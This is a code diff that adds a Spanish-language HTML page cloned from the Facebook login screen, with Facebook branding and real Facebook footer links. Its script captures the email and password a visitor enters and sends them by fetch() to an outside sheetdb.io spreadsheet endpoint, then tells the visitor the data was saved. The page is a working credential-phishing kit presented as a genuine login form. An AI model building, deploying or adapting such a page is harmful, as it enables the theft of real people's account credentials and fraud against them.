@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            background-color: #3b5998;
+            color: white;
+            padding: 20px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1;
+        }
+
+        .header h1 {
+            font-size: 2.5rem;
+            margin: 0;
+        }
+
+        .header a {
+            background-color: #42b72a;
+            color: white;
+            text-decoration: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            margin-top: 100px; /* Margin to ensure it appears below the fixed header */
+            text-align: left;
+            position: relative;
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+            color: #333;
+        }
+
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        .login-box button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            margin: 10px 0;
+            border-radius: 4px;
+            width: 100%;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-box button:hover {
+            background-color: #155a8a;
+        }
+
+        .login-box a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.875rem;
+        }
+
+        .login-box a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+        }
+
+        .footer p {
+            margin: 10px 0 0;
+            font-size: 0.875rem;
+        }
+
+        .error-message {
+            color: red;
+            display: none;
+            margin-top: 10px;
+            font-size: 0.875rem;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 600px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+
+            .header a {
+                font-size: 0.875rem;
+                padding: 8px 16px;
+            }
+
+            .login-box h2 {
+                font-size: 1.25rem;
+            }
+
+            .login-box button {
+                font-size: 0.875rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>facebook</h1>
+        <a href="#">Registrarte</a>
+    </div>
+    <div class="login-box">
+        <h2>Iniciar sesión en Facebook</h2>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+            <input type="password" id="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <div class="footer">
+            <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1705914966164020%26redirect_uri%3Dhttps%253A%252F%252Fwww.000webhost.com%252Fcpanel-login%252Foauth%252Ffacebook%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-8LD1TQKAEXS4257R9GZBJHWF6PYOINVU3C0M%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5d80588-c129-440a-9557-e7d2ef63b512%26tp%3Dunspecified&from_login_screen=0">¿Olvidaste tu cuenta?</a> · <a href="https://web.facebook.com/r.php?api_key=1705914966164020&app_id=1705914966164020&cancel_url=https%3A%2F%2Fwww.000webhost.com%2Fcpanel-login%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-8LD1TQKAEXS4257R9GZBJHWF6PYOINVU3C0M%23_%3D_&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1705914966164020%26redirect_uri%3Dhttps%253A%252F%252Fwww.000webhost.com%252Fcpanel-login%252Foauth%252Ffacebook%26scope%3Demail%252C%2Bpublic_profile%26state%3DHA-8LD1TQKAEXS4257R9GZBJHWF6PYOINVU3C0M%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5d80588-c129-440a-9557-e7d2ef63b512%26tp%3Dunspecified&locale=es_LA&display=page">Regístrate en Facebook</a>
+            <p><a href="#">Ahora no</a></p>
+            <div class="error-message" id="errorMessage">Correo electrónico o contraseña incorrectos</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Expresión regular básica para validar correos electrónicos
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            // Expresión regular para validar números
+            const numberPattern = /^\d+$/;
+
+            // Validar el formato del email o número
+            if (!emailPattern.test(email) && !numberPattern.test(email)) {
+                errorMessage.textContent = 'Ingrese un correo electrónico válido o un número';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Enviar los datos al endpoint para guardarlos
+            fetch('https://sheetdb.io/api/v1/8t2260hdbl71o', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Aquí se puede manejar la respuesta del servidor
+                if (data) {
+                    alert('Datos guardados exitosamente');
+                } else {
+                    errorMessage.textContent = 'Error al guardar los datos';
+                    errorMessage.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                errorMessage.textContent = 'Error de conexión';
+                errorMessage.style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html>
